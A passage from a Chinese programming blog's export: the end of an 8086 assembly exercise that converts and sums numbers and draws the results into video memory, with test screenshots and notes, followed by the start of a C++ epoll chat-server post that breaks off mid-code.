[SI]</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_FRAME</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   PAINT_FRAME_UP</span><br><span class="line">    FRAME_DOWN:       </span><br><span class="line">                      MOV    AX, ES</span><br><span class="line">                      ADD    AX, 28H                          ; 加四行，段地址需要除以16</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">                      MOV    DI, 0AH</span><br><span class="line">                      MOV    CX, 38</span><br><span class="line">    PAINT_FRAME_DOWN: </span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_FRAME</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   PAINT_FRAME_DOWN</span><br><span class="line">    FRAME_SIDE:       </span><br><span class="line">                      MOV    AX, 0B870H</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">                      MOV    DI, 0AH</span><br><span class="line">                      LEA    SI, FRAME_CHAR</span><br><span class="line">                      MOV    CX, 3                            ; 3行</span><br><span class="line">    PAINT_FRAME_SIDE: </span><br><span class="line">                      PUSH   CX</span><br><span class="line">                      PUSH   DI</span><br><span class="line">                      PUSH   AX</span><br><span class="line">                      MOV    CX, 2</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">    PAINT_ONE_LINE:   </span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_FRAME</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      ADD    DI, 72                           ; 跳过36个字符</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   PAINT_ONE_LINE</span><br><span class="line">                      POP    AX</span><br><span class="line">                      ADD    AX, 0AH                          ; 0A * 16 = 160</span><br><span class="line">                      POP    DI</span><br><span class="line">                      POP    CX</span><br><span class="line">                      LOOP   PAINT_FRAME_SIDE</span><br><span class="line">                      MOV    AX, 0B870H                       ; 段地址，跳过前11行，跳过22个字符</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">                      LEA    SI, OUTPUT_B</span><br><span class="line">                      MOV    DI, 0CH</span><br><span class="line">                      MOV    CX, 20</span><br><span class="line">    COLORFUL_OUTPUT_B:                                        ; 输出二进制提示信息</span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_MSG</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    SI</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   COLORFUL_OUTPUT_B</span><br><span class="line">                      MOV    CX, 16</span><br><span class="line">                      MOV    BX, RES</span><br><span class="line">    PRINT_B:          </span><br><span class="line">                      ROL    BX, 1                            ; 循环左移一位，将最高位移到最低位</span><br><span class="line">                      MOV    AX, BX</span><br><span class="line">                      AND    AL, 01H                          ; 将除了最低位的其他位置清零</span><br><span class="line">                      ADD    AL, 30H</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_NUM</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   PRINT_B</span><br><span class="line">                      CLC                                     ; CF清零</span><br><span class="line">                      MOV    AX, 0B87AH                       ; 段地址，跳过前12行，跳过22个字符</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">                      LEA    SI, OUTPUT_O</span><br><span class="line">                      MOV    DI, 0CH</span><br><span class="line">                      MOV    CX, 20</span><br><span class="line">    COLORFUL_OUTPUT_O:                                        ; 输出八进制提示信息</span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_MSG</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    SI</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   COLORFUL_OUTPUT_O</span><br><span class="line">                      MOV    AX, RES                          ; 第一个八进制</span><br><span class="line">                      ROL    AX, 1</span><br><span class="line">                      CLC                                     ; CF清零</span><br><span class="line">                      AND    AL, 01H</span><br><span class="line">                      ADD    AL, 30H</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_NUM</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    CX, 5</span><br><span class="line">                      MOV    BL, 0                            ; 4，7，10，13，16</span><br><span class="line">    PRINT_O:          </span><br><span class="line">                      PUSH   CX</span><br><span class="line">                      MOV    AX, RES                          ; 第二三四五六对应八进制</span><br><span class="line">                      MOV    CL, 4</span><br><span class="line">                      ADD    CL, BL</span><br><span class="line">                      ROL    AX, CL</span><br><span class="line">                      ADD    BL, 3</span><br><span class="line">                      AND    AL, 00000111B</span><br><span class="line">                      ADD    AL, 30H</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_NUM</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      POP    CX</span><br><span class="line">                      LOOP   PRINT_O</span><br><span class="line">                      CLC                                     ; CF清零</span><br><span class="line">                      MOV    AX, 0B884H                       ; 段地址，跳过前13行，跳过22个字符</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">                      LEA    SI, OUTPUT_H</span><br><span class="line">                      MOV    DI, 0CH</span><br><span class="line">                      MOV    CX, 20</span><br><span class="line">    COLORFUL_OUTPUT_H:                                        ; 输出十六进制提示信息</span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    AL, COLOR_MSG</span><br><span class="line">                      MOV    ES:[DI], AL</span><br><span class="line">                      INC    SI</span><br><span class="line">                      INC    DI</span><br><span class="line">                      LOOP   COLORFUL_OUTPUT_H</span><br><span class="line">                      MOV    CX, 4</span><br><span class="line">                      MOV    BL, 4                            ; 步幅</span><br><span class="line">    PRINT_H:          </span><br><span class="line">                      PUSH   CX</span><br><span class="line">                      MOV    DX, RES</span><br><span class="line">                      MOV    CL, BL</span><br><span class="line">                      ADD    BL, 4</span><br><span class="line">                      ROL    DX, CL</span><br><span class="line">                      CLC                                     ; CF清零</span><br><span class="line">                      AND    DL, 00001111B</span><br><span class="line">                      CALL   CONVERT</span><br><span class="line">                      MOV    ES:[DI], DL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      MOV    DL, COLOR_NUM</span><br><span class="line">                      MOV    ES:[DI], DL</span><br><span class="line">                      INC    DI</span><br><span class="line">                      POP    CX</span><br><span class="line">                      LOOP   PRINT_H</span><br><span class="line">    ADDAGIN:          </span><br><span class="line">                      LEA    DX, ADDMORE</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      MOV    AH, 01H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      CMP    AL, &#x27;Y&#x27;                          ; 比较输入之前换行会修改AL</span><br><span class="line">                      JZ     INPUT_AGAIN</span><br><span class="line">                      CMP    AL, &#x27;y&#x27;</span><br><span class="line">                      JZ     INPUT_AGAIN</span><br><span class="line">    OVER:             </span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      MOV    AH, 4CH</span><br><span class="line">                      INT    21H</span><br><span class="line">    INPUT_AGAIN:      </span><br><span class="line">                      LEA    DX, NEWLINE                      ; 输入Y/y跳转之后再换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, ADD_MSG</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, NEWSTR</span><br><span class="line">                      MOV    BX, DX</span><br><span class="line">                      MOV    AL, 20                           ; 设置最大字符数</span><br><span class="line">                      MOV    DS:[BX], AL</span><br><span class="line">                      MOV    AH, 0AH</span><br><span class="line">                      INT    21H</span><br><span class="line">                      MOV    SI, DX                           ; 指向新输入的字符串</span><br><span class="line">                      MOV    CL, [SI + 1]                     ; 新输入的字符串长度</span><br><span class="line">                      ADD    SI, 2                            ; 指向第一个字符</span><br><span class="line">                      CALL   CLEAR_FRONT_NEW                  ; 清除新字符串的前缀零</span><br><span class="line">    ADD_NEW_TO_FIVE:  </span><br><span class="line">                      CMP    CL, 05H                          ; 比较新字符串是否是五位数</span><br><span class="line">                      JZ     ADD_OLD_TO_FIVE</span><br><span class="line">                      JA     ERROR</span><br><span class="line">                      PUSH   SI                               ; 存储新字符串起始位置</span><br><span class="line">                      PUSH   SI</span><br><span class="line">                      ADD    SI, 4</span><br><span class="line">                      MOV    DI, SI                           ; DI指向五位数最后一位</span><br><span class="line">                      POP    SI</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      PUSH   CX</span><br><span class="line">                      DEC    CX</span><br><span class="line">                      ADD    SI, CX                           ; SI指向当前字符串最后一位</span><br><span class="line">                      POP    CX</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      PUSH   CX</span><br><span class="line">    MOVE:             </span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    [DI], AL                         ; 依次后移</span><br><span class="line">                      DEC    SI</span><br><span class="line">                      DEC    DI</span><br><span class="line">                      LOOP   MOVE</span><br><span class="line">                      POP    CX</span><br><span class="line">                      POP    SI</span><br><span class="line">                      PUSH   SI</span><br><span class="line">                      MOV    AL, 5</span><br><span class="line">                      SUB    AL, CL                           ; AL = 5 - CL -&gt; 补零个数</span><br><span class="line">                      MOV    CL, AL                           ; 剩余位置补零</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">    ADD_ZERO:         </span><br><span class="line">                      MOV    BYTE PTR [SI], 30H</span><br><span class="line">                      INC    SI</span><br><span class="line">                      LOOP   ADD_ZERO</span><br><span class="line">                      POP    SI                               ; 新字符串的起始位置已经在CLEAR_FRONT中存入了最大长度字段</span><br><span class="line">                      MOV    CL, 05H                          ; 最终长度为5</span><br><span class="line">                      LEA    DI, NEWSTR</span><br><span class="line">                      MOV    [DI + 1], CL                     ; 实际长度修改为5</span><br><span class="line">    ADD_OLD_TO_FIVE:  </span><br><span class="line">                      LEA    SI, MYSTR</span><br><span class="line">                      MOV    CL, [SI + 1]                     ; 取出旧字符串实际长度</span><br><span class="line">                      CMP    CL, 05H</span><br><span class="line">                      JZ     ADD_NEW_TO_OLD</span><br><span class="line">                      MOV    SI, DS:[SI]                      ; SI指向旧字符串第一个字符</span><br><span class="line">                      AND    SI, 0FFH                         ; 高位字节清零</span><br><span class="line">                      PUSH   SI</span><br><span class="line">                      PUSH   SI</span><br><span class="line">                      ADD    SI, 4</span><br><span class="line">                      MOV    DI, SI                           ; DI指向五位数最后一位</span><br><span class="line">                      POP    SI</span><br><span class="line">                      PUSH   CX</span><br><span class="line">                      DEC    CL</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      ADD    SI, CX                           ; SI指向当前字符串最后一位</span><br><span class="line">                      POP    CX</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      PUSH   CX</span><br><span class="line">    MOVE_OLD:         </span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      MOV    [DI], AL                         ; 依次后移</span><br><span class="line">                      DEC    SI</span><br><span class="line">                      DEC    DI</span><br><span class="line">                      LOOP   MOVE_OLD</span><br><span class="line">                      POP    CX</span><br><span class="line">                      POP    SI</span><br><span class="line">                      PUSH   SI</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      MOV    AL, 5</span><br><span class="line">                      SUB    AL, CL</span><br><span class="line">                      MOV    CL, AL                           ; 剩余位置补零</span><br><span class="line">    ADD_OLD_ZERO:     </span><br><span class="line">                      MOV    BYTE PTR [SI], 30H</span><br><span class="line">                      INC    SI</span><br><span class="line">                      LOOP   ADD_OLD_ZERO</span><br><span class="line">                      POP    SI</span><br><span class="line">                      MOV    CL, 05H                          ; 最终长度为5</span><br><span class="line">                      LEA    DI, MYSTR</span><br><span class="line">                      MOV    [DI + 1], CL                     ; 实际长度修改为5</span><br><span class="line">    ADD_NEW_TO_OLD:   </span><br><span class="line">                      LEA    SI, NEWSTR</span><br><span class="line">                      MOV    SI, [SI]                         ; 指向第一个字符</span><br><span class="line">                      AND    SI, 0FFH</span><br><span class="line">                      LEA    DI, MYSTR</span><br><span class="line">                      MOV    DI, [DI]                         ; 指向第一个字符</span><br><span class="line">                      AND    DI, 0FFH</span><br><span class="line">                      ADD    SI, 4                            ; SI指向新字符串第五位字符</span><br><span class="line">                      ADD    DI, 4                            ; DI指向旧字符串第五位字符</span><br><span class="line">                      MOV    CX, 05H</span><br><span class="line">                      PUSH   SI</span><br><span class="line">    SUB_NEW_TO_NUM:                                           ; 避免因为新旧字符串都有30H导致对CF造成影响</span><br><span class="line">                      SUB    BYTE PTR [SI], 30H               ; 如果是WORD PTR, 30H高位为0，也没有影响</span><br><span class="line">                      DEC    SI</span><br><span class="line">                      LOOP   SUB_NEW_TO_NUM</span><br><span class="line">                      POP    SI</span><br><span class="line">                      CMP    BYTE PTR [SI-4], 6               ; 判断五位数第一个数字是否合法，只要保证合法就不会发生五位数溢出</span><br><span class="line">                      JA     ERROR</span><br><span class="line">                      MOV    CX, 05H</span><br><span class="line">    ADD_NEW_AND_OLD:  </span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      ADD    [DI], AL</span><br><span class="line">                      MOV    AL, [DI]</span><br><span class="line">                      CMP    AL, 39H</span><br><span class="line">                      JA     ABOVE_NINE</span><br><span class="line">    NEXT:             </span><br><span class="line">                      DEC    SI</span><br><span class="line">                      DEC    DI</span><br><span class="line">                      LOOP   ADD_NEW_AND_OLD</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      LEA    SI, MYSTR                        ; 字符串存储地址</span><br><span class="line">                      MOV    CL, [SI + 1]                     ; 实际字符个数</span><br><span class="line">                      MOV    SI, [SI]                         ; 指向第一个字符</span><br><span class="line">                      AND    SI, 0FFH</span><br><span class="line">                      JMP    READY</span><br><span class="line">    ABOVE_NINE:                                               ; 超出39，该位减十，高位加一</span><br><span class="line">                      SUB    AL, 0AH</span><br><span class="line">                      MOV    [DI], AL</span><br><span class="line">                      MOV    BX, DI</span><br><span class="line">                      DEC    BX</span><br><span class="line">                      INC    BYTE PTR [BX]</span><br><span class="line">                      JMP    NEXT</span><br><span class="line">    CONVERT:          </span><br><span class="line">                      CMP    DL, 0AH</span><br><span class="line">                      JB     BELOW</span><br><span class="line">                      ADD    DL, 07H</span><br><span class="line">    BELOW:            </span><br><span class="line">                      ADD    DL, 30H</span><br><span class="line">                      RET</span><br><span class="line">    CLEAR_FRONT:      </span><br><span class="line">                      CMP    CL, 01H</span><br><span class="line">                      JZ     FINISH</span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      CMP    AL, 30H                          ; &#x27;0&#x27;</span><br><span class="line">                      JNE    FINISH</span><br><span class="line">                      INC    SI                               ; 跳过当前字符</span><br><span class="line">                      DEC    CL                               ; 长度减一</span><br><span class="line">                      JMP    CLEAR_FRONT</span><br><span class="line">    FINISH:           </span><br><span class="line">                      LEA    DI, MYSTR</span><br><span class="line">                      MOV    [DI], SI                         ; 将第一个字符的位置存储到字符串的最大容量字段</span><br><span class="line">                      MOV    [DI + 1], CL                     ; 将修改后的长度填入字符串实际长度字段</span><br><span class="line">                      RET</span><br><span class="line">    CLEAR_FRONT_NEW:  </span><br><span class="line">                      CMP    CL, 01H</span><br><span class="line">                      JZ     FINISH_NEW</span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      CMP    AL, 30H                          ; &#x27;0&#x27;</span><br><span class="line">                      JNE    FINISH_NEW</span><br><span class="line">                      INC    SI                               ; 跳过当前字符</span><br><span class="line">                      DEC    CL                               ; 长度减一</span><br><span class="line">                      JMP    CLEAR_FRONT_NEW</span><br><span class="line">    FINISH_NEW:       </span><br><span class="line">                      LEA    DI, NEWSTR</span><br><span class="line">                      MOV    [DI], SI                         ; 将第一个字符的位置存储到字符串的最大容量字段</span><br><span class="line">                      MOV    [DI + 1], CL                     ; 将修改后的长度填入字符串实际长度字段</span><br><span class="line">                      RET</span><br><span class="line">    CHECK_LEN:        </span><br><span class="line">                      CMP    CL, 05H                          ; 最大65535，5位</span><br><span class="line">                      JA     ERROR</span><br><span class="line">                      RET</span><br><span class="line">    CHECK_FIVE_DIGITS:</span><br><span class="line">                      PUSH   CX                               ; 数据长度, PUSH至少是WORD</span><br><span class="line">                      PUSH   SI                               ; 字符串指针</span><br><span class="line">                      CMP    CX, 05H</span><br><span class="line">                      JB     CHECK_FIVE_FINISH                ; 不到五位不用比较</span><br><span class="line">                      LEA    DI, MAX_NUM</span><br><span class="line">                      MOV    CX, 05H</span><br><span class="line">    CHECK_FIVE:       </span><br><span class="line">                      MOV    AL, [DI]</span><br><span class="line">                      CMP    AL, [SI]</span><br><span class="line">                      JB     ERROR</span><br><span class="line">                      JA     CHECK_FIVE_FINISH</span><br><span class="line">                      INC    DI</span><br><span class="line">                      INC    SI</span><br><span class="line">                      LOOP   CHECK_FIVE</span><br><span class="line">    CHECK_FIVE_FINISH:</span><br><span class="line">                      POP    SI</span><br><span class="line">                      POP    CX</span><br><span class="line">                      RET</span><br><span class="line">    CHECK_NUM:        </span><br><span class="line">                      CMP    BL, 09H                          ; 保证每位数字在0~9</span><br><span class="line">                      JA     ERROR</span><br><span class="line">                      RET</span><br><span class="line">    ERROR:            </span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行, 保留用户输入</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, ERROR_MSG                    ; 错误提示</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, AGAIN</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      MOV    AH, 01H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      CMP    AL, &#x27;Y&#x27;</span><br><span class="line">                      JZ     RESTART</span><br><span class="line">                      CMP    AL, &#x27;y&#x27;</span><br><span class="line">                      JZ     RESTART</span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      JMP    OVER</span><br><span class="line">    RESTART:          </span><br><span class="line">                      LEA    DX, CLEAR                        ; 清空整页</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      JMP    INPUT</span><br><span class="line">CODE ENDS</span><br><span class="line">        END START</span><br></pre></td></tr></table></figure><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p><strong>① 输入合法数据：3456</strong></p><p><img src="https://s2.loli.net/2023/11/11/c5zJOIagDeFWVAi.jpg" alt="img"> </p><p><strong>② 在屏幕中间输出进制转换结果并提示选择累加或退出</strong></p><p><img src="https://z1.ax1x.com/2023/11/11/pi8rAjs.jpg" alt="wps2"> </p><p><strong>③ 输入Y选择累加，输入累加数据：00003456</strong></p><p><img src="https://z1.ax1x.com/2023/11/11/pi8rZBq.jpg" alt="wps3"> </p><p><strong>④ 输出相加后的转换结果并提示选择累加或退出</strong></p><p><img src="https://z1.ax1x.com/2023/11/11/pi8rVun.jpg" alt="wps4"> </p><p><strong>⑤ 输入累加数据：65535，触发溢出，提示用户选择重新开始或退出</strong><img src="https://z1.ax1x.com/2023/11/11/pi8reH0.jpg" alt="wps5"></p><p><strong>⑥ 测试非法字符：A2134</strong></p><p><img src="https://z1.ax1x.com/2023/11/11/pi8rkcj.jpg" alt="wps6"> </p><p><strong>⑦ 测试非法数值：65536</strong></p><p><img src="https://z1.ax1x.com/2023/11/11/pi8rnEV.jpg" alt="wps7"> </p><p><strong>⑧ 测试非法长度：123456</strong></p><p><img src="https://s2.loli.net/2023/11/11/iP4ayjz5JeotpFV.jpg" alt="img"> </p><p><strong>⑨ 测试五位数累加溢出：先输入数据65535（带前缀0也可以），再输入可以造成溢出的数据99000，检测到溢出</strong><img src="https://z1.ax1x.com/2023/11/11/pi8ruNT.jpg" alt="wps9"></p><p><img src="https://z1.ax1x.com/2023/11/11/pi8rK4U.jpg" alt="wps10"> </p><p><strong>⑩ 输入Y和y之外的任意字符退出程序</strong></p><p><img src="https://s2.loli.net/2023/11/11/cfEkYF8jKZq1tTg.jpg" alt="img"> </p><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><p><strong>01号功能</strong></p><ul><li>功能：字符输入</li><li>出口：<code>AL</code></li></ul><p><strong>02号功能</strong></p><ul><li>功能：字符输出</li><li>入口：<code>DL</code></li></ul><p><strong>09号功能</strong></p><ul><li>功能：字符串输出</li><li>入口：<code>DX</code></li></ul><p><strong>0A号功能</strong></p><ul><li>功能：字符串输入</li><li>出口：<code>DX</code></li><li>注意：<code>DX</code>指向字符串地址，需要提前初始化(主要是初始化字符串的第一个字节，这个字节代表了该字符串可以容纳字符的个数，设置为<code>FF</code>表示无限制存储)，第一位是最大字符数，第二位是实际字符数，第三位开始是真正的字符串</li></ul><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>初始化栈段时要记得初始化栈顶指针<code>SP</code></li><li>使用<code>0A</code>号功能接受字符串要注意提前设置最大容量</li><li>换行会导致寄存器被修改，例如刚刚使用<code>01</code>号功能接收字符就使用换行会导致<code>AL</code>被修改丢失数据</li><li>使用内存操作数养成习惯规定PTR，避免使用字类型寄存器接收字节内存数据导致数据出错</li></ul><h2 id="拓展练习"><a href="#拓展练习" class="headerlink" title="拓展练习"></a>拓展练习</h2><ul><li>累加过程中提示用户当前可输入的最大值</li><li>累加发生溢出允许用户撤销此次输入并回退到上一个合法输出</li></ul>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 输入输出 </tag>
            
            <tag> 显存 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>epoll实现简易聊天小程序</title>
      <link href="/post/587c1dda.html"/>
      <url>/post/587c1dda.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天博客托管平台被墙了，正好碰上阿里云学生计划送了7个月的云服务器，把博客部署完想着正好能用来学学网络编程</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span><span class="comment">// epoll_create</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span><span class="comment">// perror</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大连接数</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_CONN = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端信息</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Client</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sockfd;</span><br><span class="line">std::string name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建监听socket</span></span><br><span class="line"><span class="type">int</span> sockfd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sockfd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;socket create error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定本地IP和端口</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr;<span class="comment">// &lt;netinet/in.h&gt;</span></span><br><span class="line">addr.sin_family = AF_INET;<span class="comment">// IPv4</span></span><br><span class="line">addr.sin_addr.s_addr = <span 